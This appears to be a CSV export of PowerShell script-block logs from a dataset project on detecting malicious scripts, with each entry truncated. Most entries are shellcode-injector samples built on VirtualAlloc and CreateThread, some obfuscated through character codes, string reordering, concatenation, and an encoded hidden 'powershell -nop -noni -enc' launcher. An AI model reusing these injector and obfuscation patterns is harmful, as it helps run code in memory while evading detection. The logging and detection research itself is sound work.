"8/6/2026 10:15:16 AM","","2331","$Ega = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:15:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1514.ps1","3017",".( $env:COMSpEC[4,26,25]-JoiN'')((((""{13}{57}{10}{23}{24}{33}{14}{45}{56}{72}{52}{3}{42}{4}{47}{63}{16}{9}{18}{60}{34}{38}{19}{62}{65}{58}{21}{1}{8}{22}{71}{41}{66}{29}{11}{20}{27}{55}{26}{40}{64}{46}"
"8/6/2026 10:15:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:08 AM","","2331","$Ega = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:15:08 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1514.ps1","2700","& ( $ENV:cOmsPeC[4,15,25]-jOiN'') (('SRwEga = sKu[DllImport(2C3kernel32.dll2C3)]public static exte'+'rn IntPtr VirtualAlloc(IntPtr '+'lpAddress, '+'uint dwSize, uint flAllocationType, uint flProtect);"
"8/6/2026 10:15:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:15:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:15:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:15:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:15:00 AM","","2333"," $Ega = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:15:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1514.ps1","20","{ ( [Char][INt] $_)}"
"8/6/2026 10:15:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1514.ps1","10291","""$( sv 'oFS' '') "" +[stRINg]( ( 36 ,69,103,97,32, 61 , 32 ,39,91 , 68, 108,108, 73 ,109 ,112 , 111 , 114,116 , 40, 34 ,107 , 101,114 ,110 ,101, 108, 51 ,50, 46,100 ,108,108,34,41 , 93 ,112 ,117 , 98,1"
"8/6/2026 10:14:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:52 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1514.ps1","2331","$Ega = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:14:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1513.ps1","3129","$O2av = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:14:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:36 AM","","3123","$O2av = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:14:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1513.ps1","3822"," & ( $sheLLid[1]+$sHeLLid[13]+'X')(((""{35}{11}{32}{37}{16}{61}{13}{52}{5}{8}{14}{6}{10}{18}{48}{28}{29}{34}{40}{27}{21}{55}{44}{3}{15}{30}{60}{9}{20}{17}{1}{33}{56}{2}{51}{57}{54}{59}{58}{63}{41}{38}{"
"8/6/2026 10:14:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:28 AM","","3123","$O2av = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:14:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1513.ps1","3658"," (('YviCO2av '+'= 7sD[DllImport('+'En90ke'+'r'+'nel32.dllEn90)]public sta'+'ti'+'c extern '+'IntP'+'tr VirtualAlloc(IntPtr lpAddress,'+' uint dwSize, uint flAllocationType, uint flProtect);[DllImport("
"8/6/2026 10:14:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:20 AM","","3123","$O2av = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:14:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1513.ps1","24","{( [INt]$_ -As [CHAr]) }"
"8/6/2026 10:14:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1513.ps1","13644"," & ( $EnV:CoMSPec[4,15,25]-Join'')(-jOiN (( 36 , 79, 50, 97 ,118,32,61,32, 39 , 91, 68 , 108 , 108 ,73, 109 ,112 ,111,114,116, 40, 34,107 , 101 ,114 ,110,101,108, 51 ,50,46 , 100 , 108, 108, 34,41, 93"
"8/6/2026 10:14:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:11 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1513.ps1","3123","$O2av = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:14:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:14:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:14:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:14:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:14:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1493.ps1","2326","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:13:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:55 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:13:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1493.ps1","3045","((""{16}{65}{50}{14}{59}{51}{8}{48}{6}{20}{27}{42}{55}{52}{18}{22}{34}{69}{39}{26}{5}{21}{35}{33}{1}{12}{70}{68}{67}{10}{24}{41}{11}{2}{17}{31}{25}{23}{38}{60}{3}{49}{32}{44}{30}{72}{64}{13}{15}{66}{57"
"8/6/2026 10:13:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:48 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:13:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1493.ps1","2770","(('Zg0c = VHS[DllImport(xrpkernel32.dllxrp)]public static'+' extern IntPtr Virt'+'ualAlloc(IntPtr lpAdd'+'ress, uint dwSize, uint flAllocationType, ui'+'nt flProtect'+');[DllImport(xrpkernel32.dllxr'+"
"8/6/2026 10:13:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:39 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:13:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1493.ps1","20","{ ([CHar][iNT] $_) }"
"8/6/2026 10:13:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1493.ps1","7900","('36&99-32N61N32C39;91;68;108&108C73&109W112%111z114~116N40C34&107z101&114W110}101z108N51z50z46-100%108%108C34~41-93W112N117-98C108}105&99C32-115}116N97z116&105}99;32&101C120;116~101;114z110N32}73}110"
"8/6/2026 10:13:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:31 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1493.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:13:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1486.ps1","2252","$K9ct = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:13:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:15 AM","","2246","$K9ct = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:13:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1486.ps1","2935"," ((""{20}{56}{11}{33}{15}{1}{32}{2}{36}{63}{59}{38}{62}{53}{35}{6}{43}{49}{8}{24}{47}{64}{5}{60}{55}{18}{37}{41}{26}{10}{7}{58}{68}{16}{51}{50}{9}{44}{29}{12}{3}{54}{17}{46}{67}{0}{39}{31}{23}{30}{66}{"
"8/6/2026 10:13:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:13:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:13:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:13:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:13:07 AM","","2246","$K9ct = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:13:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1486.ps1","2641",". ( $pshOme[21]+$pShOmE[34]+'X') (('FimK9ct = 6nq[DllImport(esvkernel32.'+'dllesv)]public'+' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint '+'dwSize, uint flAllocati'+'on'+'Type, uint flPro"
"8/6/2026 10:13:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:12:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:12:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:12:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:12:59 AM","","2246","$K9ct = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:12:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1486.ps1","9818","& ( $ENV:cOmSpEC[4,15,25]-joIN'')( [ChaR[]](36, 75, 57,99 ,116 , 32 ,61 ,32 ,39, 91,68 ,108, 108,73 , 109, 112 , 111 , 114 , 116 ,40 , 34 ,107 , 101,114 ,110, 101 , 108 , 51, 50 ,46 ,100 , 108, 108,34"
"8/6/2026 10:12:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:12:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:12:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:12:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:12:51 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1486.ps1","2246","$K9ct = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:12:44 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:12:43 AM","","6597","& C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell -nop -noni -enc  JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGU"
"8/6/2026 10:12:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1484.ps1","2745","$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern I"
"8/6/2026 10:12:36 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:12:35 AM","","6597","& C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell -nop -noni -enc  JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGU"
"8/6/2026 10:12:35 AM","","2741","$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern I"
"8/6/2026 10:12:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1484.ps1","3424","(((""{5}{54}{4}{14}{26}{3}{40}{11}{12}{29}{37}{7}{53}{25}{35}{39}{9}{10}{55}{51}{43}{18}{41}{56}{8}{15}{1}{32}{28}{13}{27}{34}{44}{6}{22}{49}{17}{52}{20}{16}{47}{21}{48}{23}{0}{36}{31}{19}{38}{45}{24}{"
"8/6/2026 10:12:28 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:12:27 AM","","6597","& C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell -nop -noni -enc  JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGU"
"8/6/2026 10:12:27 AM","","2741","$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern I"
"8/6/2026 10:12:26 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1484.ps1","3386"," .( ([sTRINg]$vERBOSEPrefERENCe)[1,3]+'x'-joIn'') (('2eBv1 = UHR2eBvc = UHRUHR[DllImport(hcTkernel3'+'2.dllhcT)]public s'+'tati'+'c extern IntPtr '+'Vir'+'tualAlloc(IntPtr lpAddress, uint dwSize, uint"
"8/6/2026 10:12:20 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:12:18 AM","","6597","& C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell -nop -noni -enc  JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGU"
"8/6/2026 10:12:18 AM","","2741","$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern I"
"8/6/2026 10:12:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1484.ps1","20","{([char] [inT] $_) }"
"8/6/2026 10:12:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1484.ps1","9432"," ( '36X49&32X61!32N39h36-99@32&61N32h39N39X91z68!108X108h73z109N112S111&114d116X40&34d107X101N114!110!101S108d51h50S46z100S108X108!34z41N93z112!117d98N108&105-99d32z115d116@97-116@105X99d32-101X120&11"
"8/6/2026 10:12:11 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:12:10 AM","","6597","& C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell -nop -noni -enc  JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGU"
"8/6/2026 10:12:10 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1484.ps1","2741","$1 = '$c = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern I"
"8/6/2026 10:12:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:12:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:12:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:12:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:12:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1477.ps1","2252","$usQ9 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:11:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:54 AM","","2246","$usQ9 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:11:54 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1477.ps1","2841"," (((""{13}{10}{25}{29}{1}{36}{20}{35}{15}{34}{5}{40}{2}{22}{43}{23}{38}{4}{41}{42}{39}{32}{24}{37}{21}{3}{18}{14}{12}{17}{44}{19}{46}{8}{28}{9}{16}{11}{26}{0}{45}{33}{6}{30}{27}{31}{7}""-f'x5f,0xff,0xd5"
"8/6/2026 10:11:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:46 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:46 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:46 AM","","2246","$usQ9 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:11:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1477.ps1","2655"," . ( $PSHOME[21]+$PShoME[30]+'X')((('Vki'+'usQ9 = FTP[DllImpo'+'rt('+'T0Okernel32.dllT0O)]publi'+'c st'+'atic extern IntPtr Vir'+'tualAlloc(I'+'ntPtr lpAdd'+'ress, uint dwSize, uint flAllocationType, "
"8/6/2026 10:11:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:38 AM","","2246","$usQ9 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:11:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1477.ps1","19","{( [chaR][iNt] $_)}"
"8/6/2026 10:11:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1477.ps1","7631","&( $Env:COmspEc[4,15,25]-joiN'')(( '36;117d115;81d57P32o61B32d39A91:68d108d108_73<109:112B111P114_116P40<34_107B101d114B110o101>108B51>50;46P100A108<108o34B41B93_112P117o98;108d105:99:32;115o116:97_11"
"8/6/2026 10:11:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:30 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1477.ps1","2246","$usQ9 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:11:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1474.ps1","2783","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:11:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
